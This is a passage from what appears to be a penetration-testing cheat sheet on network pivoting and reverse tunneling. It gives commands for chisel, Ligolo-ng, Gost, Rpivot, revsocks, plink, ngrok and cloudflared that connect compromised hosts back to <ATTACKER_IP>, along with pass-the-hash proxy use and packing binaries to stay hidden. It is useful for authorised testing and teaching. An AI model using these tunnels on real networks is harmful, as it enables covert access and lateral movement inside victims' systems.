+<div class="highlight"><pre><span></span><code><a id="__codelineno-14-1" name="__codelineno-14-1" href="#__codelineno-14-1"></a><span class="n">user</span><span class="nv">@hacker</span><span class="p">$</span> <span class="p">./</span><span class="n">chisel</span> <span class="n">server</span> <span class="n">-p</span> <span class="n">8080</span> <span class="p">-</span><span class="n">-key</span> <span class="s2">&quot;private&quot;</span> <span class="p">-</span><span class="n">-auth</span> <span class="s2">&quot;user:pass&quot;</span> <span class="p">-</span><span class="n">-reverse</span> <span class="p">-</span><span class="n">-proxy</span> <span class="s2">&quot;https://www.google.com&quot;</span>
+<a id="__codelineno-14-2" name="__codelineno-14-2" href="#__codelineno-14-2"></a><span class="p">================================================================</span>
+<a id="__codelineno-14-3" name="__codelineno-14-3" href="#__codelineno-14-3"></a><span class="n">server</span> <span class="p">:</span> <span class="n">run</span> <span class="n">the</span> <span class="n">Server</span> <span class="n">Component</span> <span class="n">of</span> <span class="n">chisel</span> 
+<a id="__codelineno-14-4" name="__codelineno-14-4" href="#__codelineno-14-4"></a><span class="n">-p</span> <span class="n">8080</span> <span class="p">:</span> <span class="n">run</span> <span class="n">server</span> <span class="n">on</span> <span class="n">port</span> <span class="n">8080</span>
+<a id="__codelineno-14-5" name="__codelineno-14-5" href="#__codelineno-14-5"></a><span class="p">-</span><span class="n">-key</span> <span class="s2">&quot;private&quot;</span><span class="p">:</span> <span class="n">use</span> <span class="s2">&quot;private&quot;</span> <span class="n">string</span> <span class="n">to</span> <span class="n">seed</span> <span class="n">the</span> <span class="n">generation</span> <span class="n">of</span> <span class="n">a</span> <span class="n">ECDSA</span> <span class="n">public</span> <span class="n">and</span> <span class="n">private</span> <span class="n">key</span> <span class="n">pair</span>
+<a id="__codelineno-14-6" name="__codelineno-14-6" href="#__codelineno-14-6"></a><span class="p">-</span><span class="n">-auth</span> <span class="s2">&quot;user:pass&quot;</span> <span class="p">:</span> <span class="n">Creds</span> <span class="n">required</span> <span class="n">to</span> <span class="n">connect</span> <span class="n">to</span> <span class="n">the</span> <span class="n">server</span>
+<a id="__codelineno-14-7" name="__codelineno-14-7" href="#__codelineno-14-7"></a><span class="p">-</span><span class="n">-reverse</span><span class="p">:</span>  <span class="n">Allow</span> <span class="n">clients</span> <span class="n">to</span> <span class="n">specify</span> <span class="n">reverse</span> <span class="n">port</span> <span class="n">forwarding</span> <span class="n">remotes</span> <span class="k">in</span> <span class="n">addition</span> <span class="n">to</span> <span class="n">normal</span> <span class="n">remotes</span><span class="p">.</span>
+<a id="__codelineno-14-8" name="__codelineno-14-8" href="#__codelineno-14-8"></a><span class="p">-</span><span class="n">-proxy</span> <span class="n">https</span><span class="p">://</span><span class="n">www</span><span class="p">.</span><span class="n">google</span><span class="p">.</span><span class="n">com</span> <span class="p">:</span> <span class="n">Specifies</span> <span class="n">another</span> <span class="n">HTTP</span> <span class="n">server</span> <span class="n">to</span> <span class="n">proxy</span> <span class="n">requests</span> <span class="n">to</span> <span class="n">when</span> <span class="n">chisel</span> <span class="n">receives</span> <span class="n">a</span> <span class="n">normal</span> <span class="n">HTTP</span> <span class="n">request</span><span class="p">.</span> <span class="n">Useful</span> <span class="k">for</span> <span class="n">hiding</span> <span class="n">chisel</span> <span class="k">in</span> <span class="n">plain</span> <span class="n">sight</span><span class="p">.</span>
+<a id="__codelineno-14-9" name="__codelineno-14-9" href="#__codelineno-14-9"></a>
+<a id="__codelineno-14-10" name="__codelineno-14-10" href="#__codelineno-14-10"></a><span class="n">user</span><span class="nv">@victim</span><span class="p">$</span> <span class="n">SharpChisel</span><span class="p">.</span><span class="n">exe</span> <span class="n">client</span> <span class="p">-</span><span class="n">-auth</span> <span class="n">user</span><span class="p">:</span><span class="n">pass</span> <span class="n">https</span><span class="p">://</span><span class="n">redacted</span><span class="p">.</span><span class="n">cloudfront</span><span class="p">.</span><span class="n">net</span> <span class="n">R</span><span class="p">:</span><span class="n">1080</span><span class="p">:</span><span class="n">socks</span>
+</code></pre></div>
+<h2 id="ligolo">Ligolo</h2>
+<p>Ligolo : Reverse Tunneling made easy for pentesters, by pentesters</p>
+<ol>
+<li>Build Ligolo
+  <div class="highlight"><pre><span></span><code><a id="__codelineno-15-1" name="__codelineno-15-1" href="#__codelineno-15-1"></a><span class="c"># Get Ligolo and dependencies</span>
+<a id="__codelineno-15-2" name="__codelineno-15-2" href="#__codelineno-15-2"></a><span class="nb">cd </span><span class="p">`</span><span class="n">go</span> <span class="n">env</span> <span class="n">GOPATH</span><span class="p">`/</span><span class="n">src</span>
+<a id="__codelineno-15-3" name="__codelineno-15-3" href="#__codelineno-15-3"></a><span class="n">git</span> <span class="n">clone</span> <span class="n">https</span><span class="p">://</span><span class="n">github</span><span class="p">.</span><span class="n">com</span><span class="p">/</span><span class="n">sysdream</span><span class="p">/</span><span class="n">ligolo</span>
+<a id="__codelineno-15-4" name="__codelineno-15-4" href="#__codelineno-15-4"></a><span class="nb">cd </span><span class="n">ligolo</span>
+<a id="__codelineno-15-5" name="__codelineno-15-5" href="#__codelineno-15-5"></a><span class="n">make</span> <span class="n">dep</span>
+<a id="__codelineno-15-6" name="__codelineno-15-6" href="#__codelineno-15-6"></a>
+<a id="__codelineno-15-7" name="__codelineno-15-7" href="#__codelineno-15-7"></a><span class="c"># Generate self-signed TLS certificates (will be placed in the certs folder)</span>
+<a id="__codelineno-15-8" name="__codelineno-15-8" href="#__codelineno-15-8"></a><span class="n">make</span> <span class="n">certs</span> <span class="n">TLS_HOST</span><span class="p">=</span><span class="n">example</span><span class="p">.</span><span class="n">com</span>
+<a id="__codelineno-15-9" name="__codelineno-15-9" href="#__codelineno-15-9"></a>
+<a id="__codelineno-15-10" name="__codelineno-15-10" href="#__codelineno-15-10"></a><span class="n">make</span> <span class="n">build-all</span>
+</code></pre></div></li>
+<li>Use Ligolo
+  <div class="highlight"><pre><span></span><code><a id="__codelineno-16-1" name="__codelineno-16-1" href="#__codelineno-16-1"></a><span class="c"># On your attack server.</span>
+<a id="__codelineno-16-2" name="__codelineno-16-2" href="#__codelineno-16-2"></a><span class="p">./</span><span class="n">bin</span><span class="p">/</span><span class="n">localrelay_linux_amd64</span>
+<a id="__codelineno-16-3" name="__codelineno-16-3" href="#__codelineno-16-3"></a>
+<a id="__codelineno-16-4" name="__codelineno-16-4" href="#__codelineno-16-4"></a><span class="c"># On the compromise host.</span>
+<a id="__codelineno-16-5" name="__codelineno-16-5" href="#__codelineno-16-5"></a><span class="n">ligolo_windows_amd64</span><span class="p">.</span><span class="n">exe</span> <span class="n">-relayserver</span> <span class="n">LOCALRELAYSERVER</span><span class="p">:</span><span class="n">5555</span>
+</code></pre></div></li>
+</ol>
+<h2 id="ligolo-ng">Ligolo-ng</h2>
+<p>Ligolo-ng : An advanced, yet simple, tunneling tool that uses TUN interfaces.</p>
+<h4 id="single-pivot">Single Pivot</h4>
+<ol>
+<li>Downloading the binaries.</li>
+<li>
+<p>The proper binaries can be downloaded from <a href="https://github.com/nicocha30/ligolo-ng/releases/tag/v0.5.2">here</a>.</p>
+</li>
+<li>
+<p>Setting up the ligolo-ng interface and IP routes.</p>
+</li>
+<li>
+<p>The initial step is to create a new interface and add an IP route to the subnet that we want to pivot to through this interface. We can easily do it through the following bash script.
+<div class="highlight"><pre><span></span><code><a id="__codelineno-17-1" name="__codelineno-17-1" href="#__codelineno-17-1"></a><span class="ch">#!/bin/bash</span>
+<a id="__codelineno-17-2" name="__codelineno-17-2" href="#__codelineno-17-2"></a>
+<a id="__codelineno-17-3" name="__codelineno-17-3" href="#__codelineno-17-3"></a>ip<span class="w"> </span>tuntap<span class="w"> </span>add<span class="w"> </span>user<span class="w"> </span>root<span class="w"> </span>mode<span class="w"> </span>tun<span class="w"> </span>ligolo
+<a id="__codelineno-17-4" name="__codelineno-17-4" href="#__codelineno-17-4"></a>ip<span class="w"> </span>link<span class="w"> </span><span class="nb">set</span><span class="w"> </span>ligolo<span class="w"> </span>up
+<a id="__codelineno-17-5" name="__codelineno-17-5" href="#__codelineno-17-5"></a>ip<span class="w"> </span>route<span class="w"> </span>add<span class="w"> </span>&lt;x.x.x.x<span class="se">\2</span><span class="m">4</span>&gt;<span class="w"> </span>dev<span class="w"> </span>ligolo
+</code></pre></div></p>
+</li>
+<li>
+<p>We can then run the script by issuing the <code>chmod +x ligolo-ng_setup.sh &amp;&amp; ./ligolo-ng_setup.sh</code></p>
+</li>
+<li>
+<p>Setting up the ligolo-ng proxy.</p>
+</li>
+<li>
+<p>After the interface has been setup, we can now start the ligolo-ng proxy. We can use any <code>&lt;PROXY_PORT&gt;</code> we want as long as it not already in use.
+<code>./proxy -laddr &lt;ATTACKER_IP&gt;:&lt;PROXY_PORT&gt; -selfcert</code></p>
+</li>
+<li>
+<p>Using the ligolo-ng agent to connect to the ligolo-ng proxy.</p>
+</li>
+<li>
+<p>In the compromised computer we can use the agent to connect back to the proxy.
+<code>./agent -connect &lt;ATTACKER_IP&gt;:&lt;PROXY_PORT&gt; -ignore-cert</code></p>
+</li>
+<li>
+<p>Start tunneling traffic through ligolo-ng.</p>
+</li>
+<li>Once the connection from the agent reaches the proxy we can use the <code>session</code> command to list the available sessions.</li>
+<li>
+<p>We can use the arrow keys to select the session we want and issue the command <code>start</code> to start tunnelling traffic through it.</p>
+</li>
+<li>
+<p>Using local tools.</p>
+</li>
+<li>After the tunneling has been initiated, we can use local offensive tools, such as CrackMapExec, Impacket, Nmap through the ligolo-ng network pivot without any kind of limitations or added lag (this is especially true for Nmap).</li>
+</ol>
+<h4 id="double-pivot">Double Pivot</h4>
+<ol>
+<li>Setting up a listener in the initial pivoting session.</li>
+<li>To start a double pivot, we have to make sure that the connection of the second agent will go through the <strong>first</strong> agent to avoid losing contact to our first pivot. To do so, we will have to create a <em>listener</em> to the ligolo-ng session responsible for the first pivot.</li>
+<li>
+<p>This command starts a listener to all the interfaces (<code>0.0.0.0</code>) of the <strong>compromised</strong>  host in port <code>4443</code> (we can replace it with any other port we want, as long as it is not already in use in the compromised initial pivot host). Any traffic that reaches this listener will be <strong>redirected to the ligolo-ng</strong> proxy (<code>--to &lt;ATTACKER_IP&gt;:&lt;PROXY_PORT&gt;</code>).
+<code>listener_add --addr 0.0.0.0:4443 --to &lt;ATTACKER_IP&gt;:&lt;PROXY_PORT&gt; --tcp</code></p>
+</li>
+<li>
+<p>Starting te second agent. </p>
+</li>
+<li>
+<p>After transferring the ligolo-ng agent to the <strong>second</strong> pivot host that we have compromised we will start a connection <strong>not directly to our ligolo-ng proxy</strong> but to the first pivoting agent.
+<code>.\agent.exe -connect &lt;1st_PIVOT_HOST_IP&gt;:4443 -ignore-cert</code></p>
+</li>
+<li>
+<p>Starting the second pivot.</p>
+</li>
+<li>
+<p>In the ligolo-ng proxy we will receive a call from the second agent through the listener of the first agent. We can use the <code>session</code> command and the arrow keys to navigate through the created sessions. Issuing the <code>start</code> and <code>stop</code> commands we can tell the ligolo-ng proxy which session will be used for tunneling traffic.</p>
+</li>
+<li>
+<p>Adding a new IP route to the second network.</p>
+</li>
+<li>
+<p>Before being able to use our local tools to the second network that we want to pivot to, we need to add a new IP route for it through the <code>ligolo</code> interface that we created in the first step.
+<code>ip route add 172.16.10.0/24 dev ligolo</code></p>
+</li>
+<li>
+<p>Using local tools.</p>
+</li>
+<li>After the tunneling has been initiated, we can use local offensive tools to the second network as well.</li>
+</ol>
+<h4 id="triple-etc-pivot">Triple, etc. Pivot</h4>
+<ul>
+<li>The process is exactly the same as the second pivot.</li>
+</ul>
+<h4 id="pivoting-to-individual-hosts-to-expose-internally-running-services">Pivoting to individual hosts to expose internally running services.</h4>
+<ul>
+<li>The same process can also be used to pivot to individual hosts instead of whole subnets. This will allow an operator to expose locally running services in the compromised server, similar to the dynamic port forwarding through SSH.</li>
+</ul>
+<h2 id="gost">Gost</h2>
+<blockquote>
+<p>Wiki English : https://docs.ginuerzh.xyz/gost/en/</p>
+</blockquote>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-18-1" name="__codelineno-18-1" href="#__codelineno-18-1"></a><span class="n">git</span> <span class="n">clone</span> <span class="n">https</span><span class="p">://</span><span class="n">github</span><span class="p">.</span><span class="n">com</span><span class="p">/</span><span class="n">ginuerzh</span><span class="p">/</span><span class="n">gost</span>
+<a id="__codelineno-18-2" name="__codelineno-18-2" href="#__codelineno-18-2"></a><span class="nb">cd </span><span class="n">gost</span><span class="p">/</span><span class="n">cmd</span><span class="p">/</span><span class="n">gost</span>
+<a id="__codelineno-18-3" name="__codelineno-18-3" href="#__codelineno-18-3"></a><span class="n">go</span> <span class="n">build</span>
+<a id="__codelineno-18-4" name="__codelineno-18-4" href="#__codelineno-18-4"></a>
+<a id="__codelineno-18-5" name="__codelineno-18-5" href="#__codelineno-18-5"></a><span class="c"># Socks5 Proxy</span>
+<a id="__codelineno-18-6" name="__codelineno-18-6" href="#__codelineno-18-6"></a><span class="n">Server</span> <span class="n">side</span><span class="p">:</span> <span class="n">gost</span> <span class="n">-L</span><span class="p">=</span><span class="n">socks5</span><span class="p">://:</span><span class="n">1080</span>
+<a id="__codelineno-18-7" name="__codelineno-18-7" href="#__codelineno-18-7"></a><span class="n">Client</span> <span class="n">side</span><span class="p">:</span> <span class="n">gost</span> <span class="n">-L</span><span class="p">=:</span><span class="n">8080</span> <span class="o">-F</span><span class="p">=</span><span class="n">socks5</span><span class="p">://</span><span class="n">server_ip</span><span class="p">:</span><span class="n">1080</span><span class="k">?</span><span class="n">notls</span><span class="p">=</span><span class="n">true</span>
+<a id="__codelineno-18-8" name="__codelineno-18-8" href="#__codelineno-18-8"></a>
+<a id="__codelineno-18-9" name="__codelineno-18-9" href="#__codelineno-18-9"></a><span class="c"># Local Port Forward</span>
+<a id="__codelineno-18-10" name="__codelineno-18-10" href="#__codelineno-18-10"></a><span class="n">gost</span> <span class="n">-L</span><span class="p">=</span><span class="n">tcp</span><span class="p">://:</span><span class="n">2222</span><span class="p">/</span><span class="n">192</span><span class="p">.</span><span class="n">168</span><span class="p">.</span><span class="n">1</span><span class="p">.</span><span class="n">1</span><span class="p">:</span><span class="n">22</span> <span class="p">[</span><span class="o">-F</span><span class="p">=..]</span>
+</code></pre></div>
+<h2 id="rpivot">Rpivot</h2>
+<p>Server (Attacker box)</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-19-1" name="__codelineno-19-1" href="#__codelineno-19-1"></a><span class="n">python</span> <span class="n">server</span><span class="o">.</span><span class="n">py</span> <span class="o">--</span><span class="n">proxy</span><span class="o">-</span><span class="n">port</span> <span class="mi">1080</span> <span class="o">--</span><span class="n">server</span><span class="o">-</span><span class="n">port</span> <span class="mi">9443</span> <span class="o">--</span><span class="n">server</span><span class="o">-</span><span class="n">ip</span> <span class="mf">0.0.0.0</span>
+</code></pre></div>
+<p>Client (Compromised box)</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-20-1" name="__codelineno-20-1" href="#__codelineno-20-1"></a><span class="n">python</span> <span class="n">client</span><span class="o">.</span><span class="n">py</span> <span class="o">--</span><span class="n">server</span><span class="o">-</span><span class="n">ip</span> <span class="o">&lt;</span><span class="n">ip</span><span class="o">&gt;</span> <span class="o">--</span><span class="n">server</span><span class="o">-</span><span class="n">port</span> <span class="mi">9443</span>
+</code></pre></div>
+<p>Through corporate proxy</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-21-1" name="__codelineno-21-1" href="#__codelineno-21-1"></a><span class="n">python</span> <span class="n">client</span><span class="o">.</span><span class="n">py</span> <span class="o">--</span><span class="n">server</span><span class="o">-</span><span class="n">ip</span> <span class="p">[</span><span class="n">server</span> <span class="n">ip</span><span class="p">]</span> <span class="o">--</span><span class="n">server</span><span class="o">-</span><span class="n">port</span> <span class="mi">9443</span> <span class="o">--</span><span class="n">ntlm</span><span class="o">-</span><span class="n">proxy</span><span class="o">-</span><span class="n">ip</span> <span class="p">[</span><span class="n">proxy</span> <span class="n">ip</span><span class="p">]</span> \
+<a id="__codelineno-21-2" name="__codelineno-21-2" href="#__codelineno-21-2"></a><span class="o">--</span><span class="n">ntlm</span><span class="o">-</span><span class="n">proxy</span><span class="o">-</span><span class="n">port</span> <span class="mi">8080</span> <span class="o">--</span><span class="n">domain</span> <span class="n">CORP</span> <span class="o">--</span><span class="n">username</span> <span class="n">jdoe</span> <span class="o">--</span><span class="n">password</span> <span class="mi">1</span><span class="n">q2w3e</span>
+</code></pre></div>
+<p>Passing the hash</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-22-1" name="__codelineno-22-1" href="#__codelineno-22-1"></a><span class="n">python</span> <span class="n">client</span><span class="o">.</span><span class="n">py</span> <span class="o">--</span><span class="n">server</span><span class="o">-</span><span class="n">ip</span> <span class="p">[</span><span class="n">server</span> <span class="n">ip</span><span class="p">]</span> <span class="o">--</span><span class="n">server</span><span class="o">-</span><span class="n">port</span> <span class="mi">9443</span> <span class="o">--</span><span class="n">ntlm</span><span class="o">-</span><span class="n">proxy</span><span class="o">-</span><span class="n">ip</span> <span class="p">[</span><span class="n">proxy</span> <span class="n">ip</span><span class="p">]</span> \
+<a id="__codelineno-22-2" name="__codelineno-22-2" href="#__codelineno-22-2"></a><span class="o">--</span><span class="n">ntlm</span><span class="o">-</span><span class="n">proxy</span><span class="o">-</span><span class="n">port</span> <span class="mi">8080</span> <span class="o">--</span><span class="n">domain</span> <span class="n">CORP</span> <span class="o">--</span><span class="n">username</span> <span class="n">jdoe</span> \
+<a id="__codelineno-22-3" name="__codelineno-22-3" href="#__codelineno-22-3"></a><span class="o">--</span><span class="n">hashes</span> <span class="mi">986</span><span class="n">D46921DDE3E58E03656362614DEFE</span><span class="p">:</span><span class="mi">50</span><span class="n">C189A98FF73B39AAD3B435B51404EE</span>
+</code></pre></div>
+<h2 id="revsocks">revsocks</h2>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-23-1" name="__codelineno-23-1" href="#__codelineno-23-1"></a><span class="c"># Listen on the server and create a SOCKS 5 proxy on port 1080</span>
+<a id="__codelineno-23-2" name="__codelineno-23-2" href="#__codelineno-23-2"></a><span class="n">user</span><span class="nv">@VPS</span><span class="p">$</span> <span class="p">./</span><span class="n">revsocks</span> <span class="n">-listen</span> <span class="p">:</span><span class="n">8443</span> <span class="n">-socks</span> <span class="n">127</span><span class="p">.</span><span class="n">0</span><span class="p">.</span><span class="n">0</span><span class="p">.</span><span class="n">1</span><span class="p">:</span><span class="n">1080</span> <span class="n">-pass</span> <span class="n">Password1234</span>
+<a id="__codelineno-23-3" name="__codelineno-23-3" href="#__codelineno-23-3"></a>
+<a id="__codelineno-23-4" name="__codelineno-23-4" href="#__codelineno-23-4"></a><span class="c"># Connect client to the server</span>
+<a id="__codelineno-23-5" name="__codelineno-23-5" href="#__codelineno-23-5"></a><span class="n">user</span><span class="nv">@PC</span><span class="p">$</span> <span class="p">./</span><span class="n">revsocks</span> <span class="n">-connect</span> <span class="n">10</span><span class="p">.</span><span class="n">10</span><span class="p">.</span><span class="n">10</span><span class="p">.</span><span class="n">10</span><span class="p">:</span><span class="n">8443</span> <span class="n">-pass</span> <span class="n">Password1234</span>
+<a id="__codelineno-23-6" name="__codelineno-23-6" href="#__codelineno-23-6"></a><span class="n">user</span><span class="nv">@PC</span><span class="p">$</span> <span class="p">./</span><span class="n">revsocks</span> <span class="n">-connect</span> <span class="n">10</span><span class="p">.</span><span class="n">10</span><span class="p">.</span><span class="n">10</span><span class="p">.</span><span class="n">10</span><span class="p">:</span><span class="n">8443</span> <span class="n">-pass</span> <span class="n">Password1234</span> <span class="n">-proxy</span> <span class="n">proxy</span><span class="p">.</span><span class="n">domain</span><span class="p">.</span><span class="k">local:</span><span class="n">3128</span> <span class="n">-proxyauth</span> <span class="n">Domain</span><span class="p">/</span><span class="n">userpame</span><span class="p">:</span><span class="n">userpass</span> <span class="n">-useragent</span> <span class="s2">&quot;Mozilla 5.0/IE Windows 10&quot;</span>
+</code></pre></div>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-24-1" name="__codelineno-24-1" href="#__codelineno-24-1"></a><span class="c"># Build for Linux</span>
+<a id="__codelineno-24-2" name="__codelineno-24-2" href="#__codelineno-24-2"></a><span class="n">git</span> <span class="n">clone</span> <span class="n">https</span><span class="p">://</span><span class="n">github</span><span class="p">.</span><span class="n">com</span><span class="p">/</span><span class="n">kost</span><span class="p">/</span><span class="n">revsocks</span>
+<a id="__codelineno-24-3" name="__codelineno-24-3" href="#__codelineno-24-3"></a><span class="n">export</span> <span class="n">GOPATH</span><span class="p">=~/</span><span class="n">go</span>
+<a id="__codelineno-24-4" name="__codelineno-24-4" href="#__codelineno-24-4"></a><span class="n">go</span> <span class="n">get</span> <span class="n">github</span><span class="p">.</span><span class="n">com</span><span class="p">/</span><span class="n">hashicorp</span><span class="p">/</span><span class="n">yamux</span>
+<a id="__codelineno-24-5" name="__codelineno-24-5" href="#__codelineno-24-5"></a><span class="n">go</span> <span class="n">get</span> <span class="n">github</span><span class="p">.</span><span class="n">com</span><span class="p">/</span><span class="n">armon</span><span class="p">/</span><span class="n">go-socks5</span>
+<a id="__codelineno-24-6" name="__codelineno-24-6" href="#__codelineno-24-6"></a><span class="n">go</span> <span class="n">get</span> <span class="n">github</span><span class="p">.</span><span class="n">com</span><span class="p">/</span><span class="n">kost</span><span class="p">/</span><span class="n">go-ntlmssp</span>
+<a id="__codelineno-24-7" name="__codelineno-24-7" href="#__codelineno-24-7"></a><span class="n">go</span> <span class="n">build</span>
+<a id="__codelineno-24-8" name="__codelineno-24-8" href="#__codelineno-24-8"></a><span class="n">go</span> <span class="n">build</span> <span class="n">-ldflags</span><span class="p">=</span><span class="s2">&quot;-s -w&quot;</span> <span class="p">&amp;&amp;</span> <span class="n">upx</span> <span class="p">-</span><span class="n">-brute</span> <span class="n">revsocks</span>
+<a id="__codelineno-24-9" name="__codelineno-24-9" href="#__codelineno-24-9"></a>
+<a id="__codelineno-24-10" name="__codelineno-24-10" href="#__codelineno-24-10"></a><span class="c"># Build for Windows</span>
+<a id="__codelineno-24-11" name="__codelineno-24-11" href="#__codelineno-24-11"></a><span class="n">go</span> <span class="n">get</span> <span class="n">github</span><span class="p">.</span><span class="n">com</span><span class="p">/</span><span class="n">hashicorp</span><span class="p">/</span><span class="n">yamux</span>
+<a id="__codelineno-24-12" name="__codelineno-24-12" href="#__codelineno-24-12"></a><span class="n">go</span> <span class="n">get</span> <span class="n">github</span><span class="p">.</span><span class="n">com</span><span class="p">/</span><span class="n">armon</span><span class="p">/</span><span class="n">go-socks5</span>
+<a id="__codelineno-24-13" name="__codelineno-24-13" href="#__codelineno-24-13"></a><span class="n">go</span> <span class="n">get</span> <span class="n">github</span><span class="p">.</span><span class="n">com</span><span class="p">/</span><span class="n">kost</span><span class="p">/</span><span class="n">go-ntlmssp</span>
+<a id="__codelineno-24-14" name="__codelineno-24-14" href="#__codelineno-24-14"></a><span class="n">GOOS</span><span class="p">=</span><span class="n">windows</span> <span class="n">GOARCH</span><span class="p">=</span><span class="n">amd64</span> <span class="n">go</span> <span class="n">build</span> <span class="n">-ldflags</span><span class="p">=</span><span class="s2">&quot;-s -w&quot;</span>
+<a id="__codelineno-24-15" name="__codelineno-24-15" href="#__codelineno-24-15"></a><span class="n">go</span> <span class="n">build</span> <span class="n">-ldflags</span> <span class="n">-H</span><span class="p">=</span><span class="n">windowsgui</span>
+<a id="__codelineno-24-16" name="__codelineno-24-16" href="#__codelineno-24-16"></a><span class="n">upx</span> <span class="n">revsocks</span>
+</code></pre></div>
+<h2 id="plink">plink</h2>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-25-1" name="__codelineno-25-1" href="#__codelineno-25-1"></a><span class="c"># exposes the SMB port of the machine in the port 445 of the SSH Server</span>
+<a id="__codelineno-25-2" name="__codelineno-25-2" href="#__codelineno-25-2"></a><span class="n">plink</span> <span class="n">-l</span> <span class="n">root</span> <span class="n">-pw</span> <span class="n">toor</span> <span class="n">-R</span> <span class="n">445</span><span class="p">:</span><span class="n">127</span><span class="p">.</span><span class="n">0</span><span class="p">.</span><span class="n">0</span><span class="p">.</span><span class="n">1</span><span class="p">:</span><span class="n">445</span> 
+<a id="__codelineno-25-3" name="__codelineno-25-3" href="#__codelineno-25-3"></a><span class="c"># exposes the RDP port of the machine in the port 3390 of the SSH Server</span>
+<a id="__codelineno-25-4" name="__codelineno-25-4" href="#__codelineno-25-4"></a><span class="n">plink</span> <span class="n">-l</span> <span class="n">root</span> <span class="n">-pw</span> <span class="n">toor</span> <span class="n">ssh-server-ip</span> <span class="n">-R</span> <span class="n">3390</span><span class="p">:</span><span class="n">127</span><span class="p">.</span><span class="n">0</span><span class="p">.</span><span class="n">0</span><span class="p">.</span><span class="n">1</span><span class="p">:</span><span class="n">3389</span>  
+<a id="__codelineno-25-5" name="__codelineno-25-5" href="#__codelineno-25-5"></a>
+<a id="__codelineno-25-6" name="__codelineno-25-6" href="#__codelineno-25-6"></a><span class="n">plink</span> <span class="n">-l</span> <span class="n">root</span> <span class="n">-pw</span> <span class="n">mypassword</span> <span class="n">192</span><span class="p">.</span><span class="n">168</span><span class="p">.</span><span class="n">18</span><span class="p">.</span><span class="n">84</span> <span class="n">-R</span>
+<a id="__codelineno-25-7" name="__codelineno-25-7" href="#__codelineno-25-7"></a><span class="n">plink</span><span class="p">.</span><span class="n">exe</span> <span class="n">-v</span> <span class="n">-pw</span> <span class="n">mypassword</span> <span class="n">user</span><span class="nv">@10</span><span class="p">.</span><span class="n">10</span><span class="p">.</span><span class="n">10</span><span class="p">.</span><span class="n">10</span> <span class="n">-L</span> <span class="n">6666</span><span class="p">:</span><span class="n">127</span><span class="p">.</span><span class="n">0</span><span class="p">.</span><span class="n">0</span><span class="p">.</span><span class="n">1</span><span class="p">:</span><span class="n">445</span>
+<a id="__codelineno-25-8" name="__codelineno-25-8" href="#__codelineno-25-8"></a>
+<a id="__codelineno-25-9" name="__codelineno-25-9" href="#__codelineno-25-9"></a><span class="n">plink</span> <span class="n">-R</span> <span class="no">[Port to forward to on your VPS]</span><span class="p">:</span><span class="n">localhost</span><span class="p">:</span><span class="no">[Port to forward on your local machine] [VPS IP]</span>
+<a id="__codelineno-25-10" name="__codelineno-25-10" href="#__codelineno-25-10"></a><span class="c"># redirects the Windows port 445 to Kali on port 22</span>
+<a id="__codelineno-25-11" name="__codelineno-25-11" href="#__codelineno-25-11"></a><span class="n">plink</span> <span class="n">-P</span> <span class="n">22</span> <span class="n">-l</span> <span class="n">root</span> <span class="n">-pw</span> <span class="n">some_password</span> <span class="n">-C</span> <span class="n">-R</span> <span class="n">445</span><span class="p">:</span><span class="n">127</span><span class="p">.</span><span class="n">0</span><span class="p">.</span><span class="n">0</span><span class="p">.</span><span class="n">1</span><span class="p">:</span><span class="n">445</span> <span class="n">192</span><span class="p">.</span><span class="n">168</span><span class="p">.</span><span class="n">12</span><span class="p">.</span><span class="n">185</span>   
+</code></pre></div>
+<h2 id="ngrok">ngrok</h2>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-26-1" name="__codelineno-26-1" href="#__codelineno-26-1"></a><span class="c"># get the binary</span>
+<a id="__codelineno-26-2" name="__codelineno-26-2" href="#__codelineno-26-2"></a><span class="nb">wget </span><span class="n">https</span><span class="p">://</span><span class="n">bin</span><span class="p">.</span><span class="n">equinox</span><span class="p">.</span><span class="n">io</span><span class="p">/</span><span class="n">c</span><span class="p">/</span><span class="n">4VmDzA7iaHb</span><span class="p">/</span><span class="n">ngrok-stable-linux-amd64</span><span class="p">.</span><span class="n">zip</span>
+<a id="__codelineno-26-3" name="__codelineno-26-3" href="#__codelineno-26-3"></a><span class="n">unzip</span> <span class="n">ngrok-stable-linux-amd64</span><span class="p">.</span><span class="n">zip</span> 
+<a id="__codelineno-26-4" name="__codelineno-26-4" href="#__codelineno-26-4"></a>
+<a id="__codelineno-26-5" name="__codelineno-26-5" href="#__codelineno-26-5"></a><span class="c"># log into the service</span>
+<a id="__codelineno-26-6" name="__codelineno-26-6" href="#__codelineno-26-6"></a><span class="p">./</span><span class="n">ngrok</span> <span class="n">authtoken</span> <span class="n">3U</span><span class="no">[REDACTED_TOKEN]</span><span class="n">Hm</span>
+<a id="__codelineno-26-7" name="__codelineno-26-7" href="#__codelineno-26-7"></a>
+<a id="__codelineno-26-8" name="__codelineno-26-8" href="#__codelineno-26-8"></a><span class="c"># deploy a port forwarding for 4433</span>
+<a id="__codelineno-26-9" name="__codelineno-26-9" href="#__codelineno-26-9"></a><span class="p">./</span><span class="n">ngrok</span> <span class="n">http</span> <span class="n">4433</span>
+<a id="__codelineno-26-10" name="__codelineno-26-10" href="#__codelineno-26-10"></a><span class="p">./</span><span class="n">ngrok</span> <span class="n">tcp</span> <span class="n">4433</span>
+</code></pre></div>
+<h2 id="cloudflared">cloudflared</h2>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-27-1" name="__codelineno-27-1" href="#__codelineno-27-1"></a><span class="c1"># Get the binary</span>
+<a id="__codelineno-27-2" name="__codelineno-27-2" href="#__codelineno-27-2"></a>wget<span class="w"> </span>https://bin.equinox.io/c/VdrWdbjqyF/cloudflared-stable-linux-amd64.tgz
+<a id="__codelineno-27-3" name="__codelineno-27-3" href="#__codelineno-27-3"></a>tar<span class="w"> </span>xvzf<span class="w"> </span>cloudflared-stable-linux-amd64.tgz
+<a id="__codelineno-27-4" name="__codelineno-27-4" href="#__codelineno-27-4"></a><span class="c1"># Expose accessible internal service to the internet</span>
+<a id="__codelineno-27-5" name="__codelineno-27-5" href="#__codelineno-27-5"></a>./cloudflared<span class="w"> </span>tunnel<span class="w"> </span>--url<span class="w"> </span>&lt;protocol&gt;://&lt;host&gt;:&lt;port&gt;
+</code></pre></div>
